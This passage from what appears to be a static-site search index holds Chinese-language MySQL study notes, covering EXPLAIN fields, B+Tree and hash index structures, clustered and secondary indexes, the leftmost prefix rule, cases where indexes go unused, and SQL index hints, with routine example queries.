\u67e5\u770b\u6307\u5b9aquery_id\u7684SQL\u8bed\u53e5CPU\u7684\u4f7f\u7528\u60c5\u51b5 <code>show profile cpu for query query_id;</code> </p>"},{"location":"program/2024-04-22-MYSQL/#explain","title":"explain","text":"<p>EXPLAIN \u6216\u8005 DESC \u547d\u4ee4\u83b7\u53d6 MySQL \u5982\u4f55\u6267\u884c SELECT \u8bed\u53e5\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5728 SELECT \u8bed\u53e5\u6267\u884c\u8fc7\u7a0b\u4e2d\u8868\u5982\u4f55\u8fde\u63a5\u548c\u8fde\u63a5\u7684\u987a\u5e8f\u3002 \u8bed\u6cd5\uff1a     # \u76f4\u63a5\u5728select\u8bed\u53e5\u4e4b\u524d\u52a0\u4e0a\u5173\u952e\u5b57 explain / desc     EXPLAIN SELECT \u5b57\u6bb5\u5217\u8868 FROM \u8868\u540d HWERE \u6761\u4ef6;  </p> <p>EXPLAIN \u5404\u5b57\u6bb5\u542b\u4e49\uff1a  </p> <ul> <li>id\uff1aselect \u67e5\u8be2\u7684\u5e8f\u5217\u53f7\uff0c\u8868\u793a\u67e5\u8be2\u4e2d\u6267\u884c select \u5b50\u53e5\u6216\u8005\u64cd\u4f5c\u8868\u7684\u987a\u5e8f\uff08id\u76f8\u540c\uff0c\u6267\u884c\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b\uff1bid\u4e0d\u540c\uff0c\u503c\u8d8a\u5927\u8d8a\u5148\u6267\u884c\uff09  </li> <li>select_type\uff1a\u8868\u793a SELECT \u7684\u7c7b\u578b\uff0c\u5e38\u89c1\u53d6\u503c\u6709 SIMPLE\uff08\u7b80\u5355\u8868\uff0c\u5373\u4e0d\u9002\u7528\u8868\u8fde\u63a5\u6216\u8005\u5b50\u67e5\u8be2\uff09\u3001PRIMARY\uff08\u4e3b\u67e5\u8be2\uff0c\u5373\u5916\u5c42\u7684\u67e5\u8be2\uff09\u3001UNION\uff08UNION\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u6216\u8005\u540e\u9762\u7684\u67e5\u8be2\u8bed\u53e5\uff09\u3001   SUBQUERY\uff08SELECT/WHERE\u4e4b\u540e\u5305\u542b\u4e86\u5b50\u67e5\u8be2\uff09\u7b49  </li> <li>type\uff1a\u8868\u793a\u8fde\u63a5\u7c7b\u578b\uff0c\u6027\u80fd\u7531\u597d\u5230\u5dee\u7684\u8fde\u63a5\u7c7b\u578b\u4e3a NULL\u3001system\u3001const\u3001eq_ref\u3001ref\u3001range\u3001index\u3001all</li> <li>possible_key\uff1a\u53ef\u80fd\u5e94\u7528\u5728\u8fd9\u5f20\u8868\u4e0a\u7684\u7d22\u5f15\uff0c\u4e00\u4e2a\u6216\u591a\u4e2a</li> <li>Key\uff1a\u5b9e\u9645\u4f7f\u7528\u7684\u7d22\u5f15\uff0c\u5982\u679c\u4e3a NULL\uff0c\u5219\u6ca1\u6709\u4f7f\u7528\u7d22\u5f15</li> <li>Key_len\uff1a\u8868\u793a\u7d22\u5f15\u4e2d\u4f7f\u7528\u7684\u5b57\u8282\u6570\uff0c\u8be5\u503c\u4e3a\u7d22\u5f15\u5b57\u6bb5\u6700\u5927\u53ef\u80fd\u957f\u5ea6\uff0c\u5e76\u975e\u5b9e\u9645\u4f7f\u7528\u957f\u5ea6\uff0c\u5728\u4e0d\u635f\u5931\u7cbe\u786e\u6027\u7684\u524d\u63d0\u4e0b\uff0c\u957f\u5ea6\u8d8a\u77ed\u8d8a\u597d</li> <li>rows\uff1aMySQL\u8ba4\u4e3a\u5fc5\u987b\u8981\u6267\u884c\u7684\u884c\u6570\uff0c\u5728InnoDB\u5f15\u64ce\u7684\u8868\u4e2d\uff0c\u662f\u4e00\u4e2a\u4f30\u8ba1\u503c\uff0c\u53ef\u80fd\u5e76\u4e0d\u603b\u662f\u51c6\u786e\u7684</li> <li>filtered\uff1a\u8868\u793a\u8fd4\u56de\u7ed3\u679c\u7684\u884c\u6570\u5360\u9700\u8bfb\u53d6\u884c\u6570\u7684\u767e\u5206\u6bd4\uff0cfiltered\u7684\u503c\u8d8a\u5927\u8d8a\u597d</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_55","title":"\u7d22\u5f15","text":"<p>\u7d22\u5f15\u662f\u5e2e\u52a9 MySQL \u9ad8\u6548\u83b7\u53d6\u6570\u636e\u7684\u6570\u636e\u7ed3\u6784\uff08\u6709\u5e8f\uff09\u3002\u5728\u6570\u636e\u4e4b\u5916\uff0c\u6570\u636e\u5e93\u7cfb\u7edf\u8fd8\u7ef4\u62a4\u7740\u6ee1\u8db3\u7279\u5b9a\u67e5\u627e\u7b97\u6cd5\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5f15\u7528\uff08\u6307\u5411\uff09\u6570\u636e\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u4e0a\u5b9e\u73b0\u9ad8\u7ea7\u67e5\u8be2\u7b97\u6cd5\uff0c\u8fd9\u79cd\u6570\u636e\u7ed3\u6784\u5c31\u662f\u7d22\u5f15\u3002</p> <p>\u4f18\u7f3a\u70b9\uff1a</p> <p>\u4f18\u70b9\uff1a</p> <ul> <li>\u63d0\u9ad8\u6570\u636e\u68c0\u7d22\u6548\u7387\uff0c\u964d\u4f4e\u6570\u636e\u5e93\u7684IO\u6210\u672c  </li> <li>\u901a\u8fc7\u7d22\u5f15\u5217\u5bf9\u6570\u636e\u8fdb\u884c\u6392\u5e8f\uff0c\u964d\u4f4e\u6570\u636e\u6392\u5e8f\u7684\u6210\u672c\uff0c\u964d\u4f4eCPU\u7684\u6d88\u8017</li> </ul> <p>\u7f3a\u70b9\uff1a</p> <ul> <li>\u7d22\u5f15\u5217\u4e5f\u662f\u8981\u5360\u7528\u7a7a\u95f4\u7684</li> <li>\u7d22\u5f15\u5927\u5927\u63d0\u9ad8\u4e86\u67e5\u8be2\u6548\u7387\uff0c\u4f46\u964d\u4f4e\u4e86\u66f4\u65b0\u7684\u901f\u5ea6\uff0c\u6bd4\u5982 INSERT\u3001UPDATE\u3001DELETE</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_56","title":"\u7d22\u5f15\u7ed3\u6784","text":"\u7d22\u5f15\u7ed3\u6784 \u63cf\u8ff0 B+Tree \u6700\u5e38\u89c1\u7684\u7d22\u5f15\u7c7b\u578b\uff0c\u5927\u90e8\u5206\u5f15\u64ce\u90fd\u652f\u6301B+\u6811\u7d22\u5f15 Hash \u5e95\u5c42\u6570\u636e\u7ed3\u6784\u662f\u7528\u54c8\u5e0c\u8868\u5b9e\u73b0\uff0c\u53ea\u6709\u7cbe\u786e\u5339\u914d\u7d22\u5f15\u5217\u7684\u67e5\u8be2\u624d\u6709\u6548\uff0c\u4e0d\u652f\u6301\u8303\u56f4\u67e5\u8be2 R-Tree(\u7a7a\u95f4\u7d22\u5f15) \u7a7a\u95f4\u7d22\u5f15\u662f MyISAM \u5f15\u64ce\u7684\u4e00\u4e2a\u7279\u6b8a\u7d22\u5f15\u7c7b\u578b\uff0c\u4e3b\u8981\u7528\u4e8e\u5730\u7406\u7a7a\u95f4\u6570\u636e\u7c7b\u578b\uff0c\u901a\u5e38\u4f7f\u7528\u8f83\u5c11 Full-Text(\u5168\u6587\u7d22\u5f15) \u662f\u4e00\u79cd\u901a\u8fc7\u5efa\u7acb\u5012\u6392\u7d22\u5f15\uff0c\u5feb\u901f\u5339\u914d\u6587\u6863\u7684\u65b9\u5f0f\uff0c\u7c7b\u4f3c\u4e8e Lucene, Solr, ES \u7d22\u5f15 InnoDB MyISAM Memory B+Tree\u7d22\u5f15 \u652f\u6301 \u652f\u6301 \u652f\u6301 Hash\u7d22\u5f15 \u4e0d\u652f\u6301 \u4e0d\u652f\u6301 \u652f\u6301 R-Tree\u7d22\u5f15 \u4e0d\u652f\u6301 \u652f\u6301 \u4e0d\u652f\u6301 Full-text 5.6\u7248\u672c\u540e\u652f\u6301 \u652f\u6301 \u4e0d\u652f\u6301"},{"location":"program/2024-04-22-MYSQL/#b-tree","title":"B-Tree","text":"<p>\u4e8c\u53c9\u6811\u5f62\u6210\u94fe\u8868\u7684\u7f3a\u70b9\u53ef\u4ee5\u7528\u7ea2\u9ed1\u6811\u6765\u89e3\u51b3\uff1a  \u7ea2\u9ed1\u6811\u4e5f\u5b58\u5728\u5927\u6570\u636e\u91cf\u60c5\u51b5\u4e0b\uff0c\u5c42\u7ea7\u8f83\u6df1\uff0c\u68c0\u7d22\u901f\u5ea6\u6162\u7684\u95ee\u9898\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528 B-Tree \u7ed3\u6784\u3002 B-Tree (\u591a\u8def\u5e73\u8861\u67e5\u627e\u6811) \u4ee5\u4e00\u68f5\u6700\u5927\u5ea6\u6570\uff08max-degree\uff0c\u6307\u4e00\u4e2a\u8282\u70b9\u7684\u5b50\u8282\u70b9\u4e2a\u6570\uff09\u4e3a5\uff085\u9636\uff09\u7684 b-tree \u4e3a\u4f8b\uff08\u6bcf\u4e2a\u8282\u70b9\u6700\u591a\u5b58\u50a84\u4e2akey\uff0c5\u4e2a\u6307\u9488\uff09</p> <p></p> <p>B-Tree \u7684\u6570\u636e\u63d2\u5165\u8fc7\u7a0b\u52a8\u753b\u53c2\u7167\uff1ahttps://www.bilibili.com/video/BV1Kr4y1i7ru?p=68 \u6f14\u793a\u5730\u5740\uff1ahttps://www.cs.usfca.edu/~galles/visualization/BTree.html</p>"},{"location":"program/2024-04-22-MYSQL/#btree","title":"B+Tree","text":"<p>\u7ed3\u6784\u56fe\uff1a</p> <p></p> <p>\u6f14\u793a\u5730\u5740\uff1ahttps://www.cs.usfca.edu/~galles/visualization/BPlusTree.html</p> <p>\u4e0e B-Tree \u7684\u533a\u522b\uff1a</p> <ul> <li>\u6240\u6709\u7684\u6570\u636e\u90fd\u4f1a\u51fa\u73b0\u5728\u53f6\u5b50\u8282\u70b9</li> <li>\u53f6\u5b50\u8282\u70b9\u5f62\u6210\u4e00\u4e2a\u5355\u5411\u94fe\u8868</li> </ul> <p>MySQL \u7d22\u5f15\u6570\u636e\u7ed3\u6784\u5bf9\u7ecf\u5178\u7684 B+Tree \u8fdb\u884c\u4e86\u4f18\u5316\u3002\u5728\u539f B+Tree \u7684\u57fa\u7840\u4e0a\uff0c\u589e\u52a0\u4e00\u4e2a\u6307\u5411\u76f8\u90bb\u53f6\u5b50\u8282\u70b9\u7684\u94fe\u8868\u6307\u9488\uff0c\u5c31\u5f62\u6210\u4e86\u5e26\u6709\u987a\u5e8f\u6307\u9488\u7684 B+Tree\uff0c\u63d0\u9ad8\u533a\u95f4\u8bbf\u95ee\u7684\u6027\u80fd\u3002</p> <p></p>"},{"location":"program/2024-04-22-MYSQL/#hash","title":"Hash","text":"<p>\u54c8\u5e0c\u7d22\u5f15\u5c31\u662f\u91c7\u7528\u4e00\u5b9a\u7684hash\u7b97\u6cd5\uff0c\u5c06\u952e\u503c\u6362\u7b97\u6210\u65b0\u7684hash\u503c\uff0c\u6620\u5c04\u5230\u5bf9\u5e94\u7684\u69fd\u4f4d\u4e0a\uff0c\u7136\u540e\u5b58\u50a8\u5728hash\u8868\u4e2d\u3002 \u5982\u679c\u4e24\u4e2a\uff08\u6216\u591a\u4e2a\uff09\u952e\u503c\uff0c\u6620\u5c04\u5230\u4e00\u4e2a\u76f8\u540c\u7684\u69fd\u4f4d\u4e0a\uff0c\u4ed6\u4eec\u5c31\u4ea7\u751f\u4e86hash\u51b2\u7a81\uff08\u4e5f\u79f0\u4e3ahash\u78b0\u649e\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u94fe\u8868\u6765\u89e3\u51b3\u3002</p> <p></p> <p>\u7279\u70b9\uff1a</p> <ul> <li>Hash\u7d22\u5f15\u53ea\u80fd\u7528\u4e8e\u5bf9\u7b49\u6bd4\u8f83\uff08=\u3001in\uff09\uff0c\u4e0d\u652f\u6301\u8303\u56f4\u67e5\u8be2\uff08betwwn\u3001&gt;\u3001&lt;\u3001...\uff09</li> <li>\u65e0\u6cd5\u5229\u7528\u7d22\u5f15\u5b8c\u6210\u6392\u5e8f\u64cd\u4f5c</li> <li>\u67e5\u8be2\u6548\u7387\u9ad8\uff0c\u901a\u5e38\u53ea\u9700\u8981\u4e00\u6b21\u68c0\u7d22\u5c31\u53ef\u4ee5\u4e86\uff0c\u6548\u7387\u901a\u5e38\u8981\u9ad8\u4e8e B+Tree \u7d22\u5f15</li> </ul> <p>\u5b58\u50a8\u5f15\u64ce\u652f\u6301\uff1a</p> <ul> <li>Memory</li> <li>InnoDB: \u5177\u6709\u81ea\u9002\u5e94hash\u529f\u80fd\uff0chash\u7d22\u5f15\u662f\u5b58\u50a8\u5f15\u64ce\u6839\u636e B+Tree \u7d22\u5f15\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u81ea\u52a8\u6784\u5efa\u7684</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_57","title":"\u9762\u8bd5\u9898","text":"<ol> <li> <p>\u4e3a\u4ec0\u4e48 InnoDB \u5b58\u50a8\u5f15\u64ce\u9009\u62e9\u4f7f\u7528 B+Tree \u7d22\u5f15\u7ed3\u6784\uff1f</p> </li> <li> <p>\u76f8\u5bf9\u4e8e\u4e8c\u53c9\u6811\uff0c\u5c42\u7ea7\u66f4\u5c11\uff0c\u641c\u7d22\u6548\u7387\u9ad8</p> </li> <li>\u5bf9\u4e8e B-Tree\uff0c\u65e0\u8bba\u662f\u53f6\u5b50\u8282\u70b9\u8fd8\u662f\u975e\u53f6\u5b50\u8282\u70b9\uff0c\u90fd\u4f1a\u4fdd\u5b58\u6570\u636e\uff0c\u8fd9\u6837\u5bfc\u81f4\u4e00\u9875\u4e2d\u5b58\u50a8\u7684\u952e\u503c\u51cf\u5c11\uff0c\u6307\u9488\u4e5f\u8ddf\u7740\u51cf\u5c11\uff0c\u8981\u540c\u6837\u4fdd\u5b58\u5927\u91cf\u6570\u636e\uff0c\u53ea\u80fd\u589e\u52a0\u6811\u7684\u9ad8\u5ea6\uff0c\u5bfc\u81f4\u6027\u80fd\u964d\u4f4e</li> <li>\u76f8\u5bf9\u4e8e Hash \u7d22\u5f15\uff0cB+Tree \u652f\u6301\u8303\u56f4\u5339\u914d\u53ca\u6392\u5e8f\u64cd\u4f5c</li> </ol>"},{"location":"program/2024-04-22-MYSQL/#_58","title":"\u7d22\u5f15\u5206\u7c7b","text":"\u5206\u7c7b \u542b\u4e49 \u7279\u70b9 \u5173\u952e\u5b57 \u4e3b\u952e\u7d22\u5f15 \u9488\u5bf9\u4e8e\u8868\u4e2d\u4e3b\u952e\u521b\u5efa\u7684\u7d22\u5f15 \u9ed8\u8ba4\u81ea\u52a8\u521b\u5efa\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a PRIMARY \u552f\u4e00\u7d22\u5f15 \u907f\u514d\u540c\u4e00\u4e2a\u8868\u4e2d\u67d0\u6570\u636e\u5217\u4e2d\u7684\u503c\u91cd\u590d \u53ef\u4ee5\u6709\u591a\u4e2a UNIQUE \u5e38\u89c4\u7d22\u5f15 \u5feb\u901f\u5b9a\u4f4d\u7279\u5b9a\u6570\u636e \u53ef\u4ee5\u6709\u591a\u4e2a \u5168\u6587\u7d22\u5f15 \u5168\u6587\u7d22\u5f15\u67e5\u627e\u7684\u662f\u6587\u672c\u4e2d\u7684\u5173\u952e\u8bcd\uff0c\u800c\u4e0d\u662f\u6bd4\u8f83\u7d22\u5f15\u4e2d\u7684\u503c \u53ef\u4ee5\u6709\u591a\u4e2a FULLTEXT <p>\u5728 InnoDB \u5b58\u50a8\u5f15\u64ce\u4e2d\uff0c\u6839\u636e\u7d22\u5f15\u7684\u5b58\u50a8\u5f62\u5f0f\uff0c\u53c8\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e24\u79cd\uff1a</p> \u5206\u7c7b \u542b\u4e49 \u7279\u70b9 \u805a\u96c6\u7d22\u5f15(Clustered Index) \u5c06\u6570\u636e\u5b58\u50a8\u4e0e\u7d22\u5f15\u653e\u4e00\u5757\uff0c\u7d22\u5f15\u7ed3\u6784\u7684\u53f6\u5b50\u8282\u70b9\u4fdd\u5b58\u4e86\u884c\u6570\u636e \u5fc5\u987b\u6709\uff0c\u800c\u4e14\u53ea\u6709\u4e00\u4e2a \u4e8c\u7ea7\u7d22\u5f15(Secondary Index) \u5c06\u6570\u636e\u4e0e\u7d22\u5f15\u5206\u5f00\u5b58\u50a8\uff0c\u7d22\u5f15\u7ed3\u6784\u7684\u53f6\u5b50\u8282\u70b9\u5173\u8054\u7684\u662f\u5bf9\u5e94\u7684\u4e3b\u952e \u53ef\u4ee5\u5b58\u5728\u591a\u4e2a <p>\u6f14\u793a\u56fe\uff1a</p> <p> </p> <p>\u805a\u96c6\u7d22\u5f15\u9009\u53d6\u89c4\u5219\uff1a</p> <ul> <li>\u5982\u679c\u5b58\u5728\u4e3b\u952e\uff0c\u4e3b\u952e\u7d22\u5f15\u5c31\u662f\u805a\u96c6\u7d22\u5f15</li> <li>\u5982\u679c\u4e0d\u5b58\u5728\u4e3b\u952e\uff0c\u5c06\u4f7f\u7528\u7b2c\u4e00\u4e2a\u552f\u4e00(UNIQUE)\u7d22\u5f15\u4f5c\u4e3a\u805a\u96c6\u7d22\u5f15</li> <li>\u5982\u679c\u8868\u6ca1\u6709\u4e3b\u952e\u6216\u6ca1\u6709\u5408\u9002\u7684\u552f\u4e00\u7d22\u5f15\uff0c\u5219 InnoDB \u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a rowid \u4f5c\u4e3a\u9690\u85cf\u7684\u805a\u96c6\u7d22\u5f15</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_59","title":"\u601d\u8003\u9898","text":"<p>1. \u4ee5\u4e0b SQL \u8bed\u53e5\uff0c\u54ea\u4e2a\u6267\u884c\u6548\u7387\u9ad8\uff1f\u4e3a\u4ec0\u4e48\uff1f</p> MySQL<pre><code>select * from user where id = 10;\nselect * from user where name = 'Arm';\n-- \u5907\u6ce8\uff1aid\u4e3a\u4e3b\u952e\uff0cname\u5b57\u6bb5\u521b\u5efa\u7684\u6709\u7d22\u5f15\n</code></pre> <p>\u7b54\uff1a\u7b2c\u4e00\u6761\u8bed\u53e5\uff0c\u56e0\u4e3a\u7b2c\u4e8c\u6761\u9700\u8981\u56de\u8868\u67e5\u8be2\uff0c\u76f8\u5f53\u4e8e\u4e24\u4e2a\u6b65\u9aa4\u3002</p> <p>2. InnoDB \u4e3b\u952e\u7d22\u5f15\u7684 B+Tree \u9ad8\u5ea6\u4e3a\u591a\u5c11\uff1f</p> <p>\u7b54\uff1a\u5047\u8bbe\u4e00\u884c\u6570\u636e\u5927\u5c0f\u4e3a1k\uff0c\u4e00\u9875\u4e2d\u53ef\u4ee5\u5b58\u50a816\u884c\u8fd9\u6837\u7684\u6570\u636e\u3002InnoDB \u7684\u6307\u9488\u5360\u75286\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\uff0c\u4e3b\u952e\u5047\u8bbe\u4e3abigint\uff0c\u5360\u7528\u5b57\u8282\u6570\u4e3a8. \u53ef\u5f97\u516c\u5f0f\uff1a<code>n * 8 + (n + 1) * 6 = 16 * 1024</code>\uff0c\u5176\u4e2d 8 \u8868\u793a bigint \u5360\u7528\u7684\u5b57\u8282\u6570\uff0cn \u8868\u793a\u5f53\u524d\u8282\u70b9\u5b58\u50a8\u7684key\u7684\u6570\u91cf\uff0c(n + 1) \u8868\u793a\u6307\u9488\u6570\u91cf\uff08\u6bd4key\u591a\u4e00\u4e2a\uff09\u3002\u7b97\u51fan\u7ea6\u4e3a1170\u3002  </p> <p>\u5982\u679c\u6811\u7684\u9ad8\u5ea6\u4e3a2\uff0c\u90a3\u4e48\u4ed6\u80fd\u5b58\u50a8\u7684\u6570\u636e\u91cf\u5927\u6982\u4e3a\uff1a<code>1171 * 16 = 18736</code>\uff1b \u5982\u679c\u6811\u7684\u9ad8\u5ea6\u4e3a3\uff0c\u90a3\u4e48\u4ed6\u80fd\u5b58\u50a8\u7684\u6570\u636e\u91cf\u5927\u6982\u4e3a\uff1a<code>1171 * 1171 * 16 = 21939856</code>\u3002  </p> <p>\u53e6\u5916\uff0c\u5982\u679c\u6709\u6210\u5343\u4e0a\u4e07\u7684\u6570\u636e\uff0c\u90a3\u4e48\u5c31\u8981\u8003\u8651\u5206\u8868\uff0c\u6d89\u53ca\u8fd0\u7ef4\u7bc7\u77e5\u8bc6\u3002  </p>"},{"location":"program/2024-04-22-MYSQL/#_60","title":"\u8bed\u6cd5","text":"<p>\u521b\u5efa\u7d22\u5f15\uff1a <code>CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name (index_col_name, ...);</code> \u5982\u679c\u4e0d\u52a0 CREATE \u540e\u9762\u4e0d\u52a0\u7d22\u5f15\u7c7b\u578b\u53c2\u6570\uff0c\u5219\u521b\u5efa\u7684\u662f\u5e38\u89c4\u7d22\u5f15  </p> <p>\u67e5\u770b\u7d22\u5f15\uff1a <code>SHOW INDEX FROM table_name;</code> </p> <p>\u5220\u9664\u7d22\u5f15\uff1a <code>DROP INDEX index_name ON table_name;</code></p> <p>\u6848\u4f8b\uff1a</p> MySQL<pre><code>-- name\u5b57\u6bb5\u4e3a\u59d3\u540d\u5b57\u6bb5\uff0c\u8be5\u5b57\u6bb5\u7684\u503c\u53ef\u80fd\u4f1a\u91cd\u590d\uff0c\u4e3a\u8be5\u5b57\u6bb5\u521b\u5efa\u7d22\u5f15\ncreate index idx_user_name on tb_user(name);\n-- phone\u624b\u673a\u53f7\u5b57\u6bb5\u7684\u503c\u975e\u7a7a\uff0c\u4e14\u552f\u4e00\uff0c\u4e3a\u8be5\u5b57\u6bb5\u521b\u5efa\u552f\u4e00\u7d22\u5f15\ncreate unique index idx_user_phone on tb_user (phone);\n-- \u4e3aprofession, age, status\u521b\u5efa\u8054\u5408\u7d22\u5f15\ncreate index idx_user_pro_age_stat on tb_user(profession, age, status);\n-- \u4e3aemail\u5efa\u7acb\u5408\u9002\u7684\u7d22\u5f15\u6765\u63d0\u5347\u67e5\u8be2\u6548\u7387\ncreate index idx_user_email on tb_user(email);\n\n-- \u5220\u9664\u7d22\u5f15  \ndrop index idx_user_email on tb_user;  \n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_61","title":"\u4f7f\u7528\u89c4\u5219","text":""},{"location":"program/2024-04-22-MYSQL/#_62","title":"\u6700\u5de6\u524d\u7f00\u6cd5\u5219","text":"<p>\u5982\u679c\u7d22\u5f15\u5173\u8054\u4e86\u591a\u5217\uff08\u8054\u5408\u7d22\u5f15\uff09\uff0c\u8981\u9075\u5b88\u6700\u5de6\u524d\u7f00\u6cd5\u5219\uff0c\u6700\u5de6\u524d\u7f00\u6cd5\u5219\u6307\u7684\u662f\u67e5\u8be2\u4ece\u7d22\u5f15\u7684\u6700\u5de6\u5217\u5f00\u59cb\uff0c\u5e76\u4e14\u4e0d\u8df3\u8fc7\u7d22\u5f15\u4e2d\u7684\u5217\u3002 \u5982\u679c\u8df3\u8dc3\u67d0\u4e00\u5217\uff0c\u7d22\u5f15\u5c06\u90e8\u5206\u5931\u6548\uff08\u540e\u9762\u7684\u5b57\u6bb5\u7d22\u5f15\u5931\u6548\uff09\u3002\u8df3\u8fc7\u7684\u8bdd\uff0c\u540e\u9762\u7684\u6392\u5e8f\u5c31\u65e0\u4ece\u8bf4\u8d77\u4e86\u3002\u6700\u5de6\u524d\u7f00\u6cd5\u5219\u5728\u7528select\u7684\u65f6\u5019\uff0c\u548c\u653e\u7684\u4f4d\u7f6e\u662f\u6ca1\u6709\u5173\u7cfb\u7684\uff0c\u53ea\u8981\u5b58\u5728\u5c31\u884c\u3002  </p> <p>\u8054\u5408\u7d22\u5f15\u4e2d\uff0c\u51fa\u73b0\u8303\u56f4\u67e5\u8be2\uff08&lt;, &gt;\uff09\uff0c\u8303\u56f4\u67e5\u8be2\u53f3\u4fa7\u7684\u5217\u7d22\u5f15\u5931\u6548\u3002\u53ef\u4ee5\u7528&gt;=\u6216\u8005&lt;=\u6765\u89c4\u907f\u7d22\u5f15\u5931\u6548\u95ee\u9898\u3002  </p>"},{"location":"program/2024-04-22-MYSQL/#_63","title":"\u7d22\u5f15\u5931\u6548\u60c5\u51b5","text":"<ol> <li>\u5728\u7d22\u5f15\u5217\u4e0a\u8fdb\u884c\u8fd0\u7b97\u64cd\u4f5c\uff0c\u7d22\u5f15\u5c06\u5931\u6548\u3002\u5982\uff1a<code>explain select * from tb_user where substring(phone, 10, 2) = '15';</code> \u6362\u6210 <code>explain select * from tb_user where phone = '17799990015';</code>\u8fd9\u662f\u53ef\u4ee5\u7684\u3002  </li> <li>\u5b57\u7b26\u4e32\u7c7b\u578b\u5b57\u6bb5\u4f7f\u7528\u65f6\uff0c\u4e0d\u52a0\u5f15\u53f7\uff0c\u7d22\u5f15\u5c06\u5931\u6548\u3002\u5982\uff1a<code>explain select * from tb_user where phone = 17799990015;</code>\uff0c\u6b64\u5904phone\u7684\u503c\u6ca1\u6709\u52a0\u5f15\u53f7  </li> <li>\u6a21\u7cca\u67e5\u8be2\u4e2d\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u5c3e\u90e8\u6a21\u7cca\u5339\u914d\uff0c\u7d22\u5f15\u4e0d\u4f1a\u662f\u5931\u6548\uff1b\u5982\u679c\u662f\u5934\u90e8\u6a21\u7cca\u5339\u914d\uff0c\u7d22\u5f15\u5931\u6548\u3002\u5982\uff1a<code>explain select * from tb_user where profession like '%\u5de5\u7a0b';</code>\uff0c\u524d\u540e\u90fd\u6709 % \u4e5f\u4f1a\u5931\u6548\u3002<code>explain select * from tb_user where profession like '\u8f6f\u4ef6%';</code> \u8fd9\u4e2a\u662f\u4e0d\u4f1a\u5931\u6548\u7684\uff0c\u53ea\u6709\u524d\u9762\u52a0\u4e86%\u624d\u4f1a\u5931\u6548\u3002  </li> <li>\u7528 or \u5206\u5272\u5f00\u7684\u6761\u4ef6\uff0c\u5982\u679c or \u5176\u4e2d\u4e00\u4e2a\u6761\u4ef6\u7684\u5217\u6ca1\u6709\u7d22\u5f15\uff0c\u90a3\u4e48\u6d89\u53ca\u7684\u7d22\u5f15\u90fd\u4e0d\u4f1a\u88ab\u7528\u5230\u3002</li> <li>\u5982\u679c MySQL \u8bc4\u4f30\u4f7f\u7528\u7d22\u5f15\u6bd4\u5168\u8868\u66f4\u6162\uff0c\u5219\u4e0d\u4f7f\u7528\u7d22\u5f15\u3002\u56e0\u4e3a\u53ea\u8981\u6709\u4e00\u4e2a\u6ca1\u6709\u7d22\u5f15\uff0c\u53e6\u5916\u4e00\u4e2a\u7528\u4e0d\u7528\u7d22\u5f15\u90fd\u6ca1\u6709\u610f\u4e49\uff0c\u90fd\u8981\u8fdb\u884c\u5168\u8868\u626b\u63cf\u3002\u6240\u4ee5\u5c31\u65e0\u9700\u7528\u7d22\u5f15\u3002</li> </ol>"},{"location":"program/2024-04-22-MYSQL/#sql","title":"SQL \u63d0\u793a","text":"<p>\u662f\u4f18\u5316\u6570\u636e\u5e93\u7684\u4e00\u4e2a\u91cd\u8981\u624b\u6bb5\uff0c\u7b80\u5355\u6765\u8bf4\uff0c\u5c31\u662f\u5728SQL\u8bed\u53e5\u4e2d\u52a0\u5165\u4e00\u4e9b\u4eba\u4e3a\u7684\u63d0\u793a\u6765\u8fbe\u5230\u4f18\u5316\u64cd\u4f5c\u7684\u76ee\u7684\u3002  </p> <p>\u4f8b\u5982\uff0c\u4f7f\u7528\u7d22\u5f15\uff1a <code>explain select * from tb_user use index(idx_user_pro) where profession=\"\u8f6f\u4ef6\u5de5\u7a0b\";</code> \u4e0d\u4f7f\u7528\u54ea\u4e2a\u7d22\u5f15\uff1a <code>explain select * from tb_user ignore index(idx_user_pro) where profession=\"\u8f6f\u4ef6\u5de5\u7a0b\";</code> \u5fc5\u987b\u4f7f\u7528\u54ea\u4e2a\u7d22\u5f15\uff1a <code>explain select * from tb_user force index(idx_user_pro) where profession=\"\u8f6f\u4ef6\u5de5\u7a0b\";</code></p> <p>use \u662f\u5efa\u8bae\uff0c\u5b9e\u9645\u4f7f\u7528\u54ea\u4e2a\u7d22\u5f15 MySQL \u8fd8\u4f1a\u81ea\u5df1\u6743\u8861\u8fd0\u884c\u901f\u5ea6\u53bb\u66f4\u6539\uff0cforce\u5c31\u662f\u65e0\u8bba\u5982\u4f55\u90fd\u5f3a\u5236\u4f7f\u7528\u8be5\u7d22\u5f15\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_64","title":"\u8986\u76d6\u7d22\u5f15&amp;\u56de\u8868\u67e5\u8be2","text":"<p>\u5c3d\u91cf\u4f7f\u7528\u8986\u76d6\u7d22\u5f15\uff08\u67e5\u8be2\u4f7f\u7528\u4e86\u7d22\u5f15\uff0c\u5e76\u4e14\u9700\u8981\u8fd4\u56de\u7684\u5217\uff0c\u5728\u8be5\u7d22\u5f15\u4e2d\u5df2\u7ecf\u5168\u90e8\u80fd\u627e\u5230\uff09\uff0c\u51cf\u5c11 select *\u3002</p> <p>explain \u4e2d extra \u5b57\u6bb5\u542b\u4e49\uff1a <code>using index condition</code>\uff1a\u67e5\u627e\u4f7f\u7528\u4e86\u7d22\u5f15\uff0c\u4f46\u662f\u9700\u8981\u56de\u8868\u67e5\u8be2\u6570\u636e <code>using where; using 